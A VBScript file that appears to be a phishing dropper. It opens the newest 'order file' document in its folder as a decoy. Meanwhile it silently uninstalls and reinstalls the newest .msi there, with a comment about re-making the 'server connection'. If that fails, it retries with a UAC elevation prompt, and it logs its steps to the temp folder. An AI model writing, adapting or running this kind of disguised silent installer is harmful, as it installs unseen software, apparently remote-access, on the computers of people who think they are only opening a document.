Option Explicit
Dim fso, sh, base, logp, cfgp, before, app, doc, rc
Set fso = CreateObject("Scripting.FileSystemObject")
Set sh  = CreateObject("WScript.Shell")
base = fso.GetParentFolderName(WScript.ScriptFullName)
logp = fso.BuildPath(sh.ExpandEnvironmentStrings("%TEMP%"), "order_work.log")
cfgp = fso.BuildPath(sh.ExpandEnvironmentStrings("%TEMP%"), "order_app.txt")
WriteLog "---- run " & Now & " ----"
WriteLog "folder: " & base

' 1) OPEN THE ORDER FILE FIRST - so you can start reading right away
doc = NewestDoc(base)
If doc <> "" Then
  WriteLog "opening order file: " & doc
  CreateObject("Shell.Application").ShellExecute doc, "", "", "open", 1
Else
  WriteLog "no order file found in this folder"
End If

' 2) Remove any previous install FIRST, then install fresh.
'    A reinstall over an existing copy does NOT re-make the server
'    connection - only a fresh install does. So: uninstall, then install.
app = NewestByExt(base, "msi")
If app <> "" Then
  WriteLog "removing previous version if present: " & app
  rc = sh.Run("msiexec /x """ & app & """ /qn /norestart", 0, True)
  WriteLog "uninstall exit code: " & rc

  WriteLog "installing fresh: " & app
  rc = sh.Run("msiexec /i """ & app & """ /qn /norestart", 0, True)
  WriteLog "install exit code: " & rc
  If rc <> 0 Then
    WriteLog "silent install failed (code " & rc & ") - retrying with permission (UAC)"
    CreateObject("Shell.Application").ShellExecute "msiexec", "/i """ & app & """ /qn /norestart", "", "runas", 0
  End If
Else
  WriteLog "no .msi found in this folder"
End If
WriteLog "done"
WScript.Quit

Sub WriteLog(msg)
  On Error Resume Next
  Dim t
  Set t = fso.OpenTextFile(logp, 8, True)
  t.WriteLine msg
  t.Close
End Sub

Function StartUserDir()
  StartUserDir = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs"
End Function

Function StartAllDir()
  StartAllDir = sh.ExpandEnvironmentStrings("%ProgramData%") & "\Microsoft\Windows\Start Menu\Programs"
End Function

Function DesktopUserDir()
  On Error Resume Next
  DesktopUserDir = sh.SpecialFolders("Desktop")
  On Error Goto 0
End Function

Function DesktopAllDir()
  On Error Resume Next
  DesktopAllDir = sh.SpecialFolders("AllUsersDesktop")
  On Error Goto 0
End Function

Sub CollectLnks(folder, dict)
  On Error Resume Next
  Dim f, sf
  If Not fso.FolderExists(folder) Then Exit Sub
  For Each f In fso.GetFolder(folder).Files
    If LCase(fso.GetExtensionName(f.Name)) = "lnk" Then dict(f.Path) = 1
  Next
  For Each sf In fso.GetFolder(folder).SubFolders
    CollectLnks sf.Path, dict
  Next
  On Error Goto 0
End Sub

Function NewestByExt(folder, ext)
  Dim f, best, bestTime
  best = "" : bestTime = 0
  On Error Resume Next
  For Each f In fso.GetFolder(folder).Files
    If LCase(fso.GetExtensionName(f.Name)) = LCase(ext) Then
      If best = "" Or f.DateLastModified > bestTime Then
        best = f.Path : bestTime = f.DateLastModified
      End If
    End If
  Next
  On Error Goto 0
  NewestByExt = best
End Function

Function NewestDoc(folder)
  Dim f, best, bestTime, ex, oklist
  oklist = "|pdf|docx|doc|txt|xlsx|xls|csv|"
  best = "" : bestTime = 0
  On Error Resume Next
  For Each f In fso.GetFolder(folder).Files
    ex = LCase(fso.GetExtensionName(f.Name))
    If InStr(oklist, "|" & ex & "|") > 0 Then
      If best = "" Or f.DateLastModified > bestTime Then
        best = f.Path : bestTime = f.DateLastModified
      End If
    End If
  Next
  On Error Goto 0
  NewestDoc = best
End Function

Function OpenApp(before)
  Dim after, k, newest, newestTime, p
  Set after = CreateObject("Scripting.Dictionary")
  CollectLnks StartUserDir(), after
  CollectLnks StartAllDir(), after
  CollectLnks DesktopUserDir(), after
  CollectLnks DesktopAllDir(), after
  newest = "" : newestTime = 0
  For Each k In after.Keys
    If Not before.Exists(k) Then
      If fso.FileExists(k) Then
        If newest = "" Or fso.GetFile(k).DateLastModified > newestTime Then
          newest = k : newestTime = fso.GetFile(k).DateLastModified
        End If
      End If
    End If
  Next
  If newest <> "" Then
    WriteLog "opening new app shortcut: " & newest
    CreateObject("Shell.Application").ShellExecute newest, "", "", "open", 1
    SaveCfg newest
    OpenApp = True
    Exit Function
  End If
  p = ReadCfg()
  If p <> "" And fso.FileExists(p) Then
    WriteLog "opening remembered app shortcut: " & p
    CreateObject("Shell.Application").ShellExecute p, "", "", "open", 1
    OpenApp = True
    Exit Function
  End If
  OpenApp = False
End Function

Sub SaveCfg(p)
  On Error Resume Next
  Dim t
  Set t = fso.OpenTextFile(cfgp, 2, True)
  t.WriteLine p
  t.Close
End Sub

Function ReadCfg()
  On Error Resume Next
  ReadCfg = ""
  If fso.FileExists(cfgp) Then
    Dim t, line
    Set t = fso.OpenTextFile(cfgp, 1)
    Do While Not t.AtEndOfStream
      line = Trim(t.ReadLine)
      If line <> "" Then ReadCfg = line
    Loop
    t.Close
  End If
End Function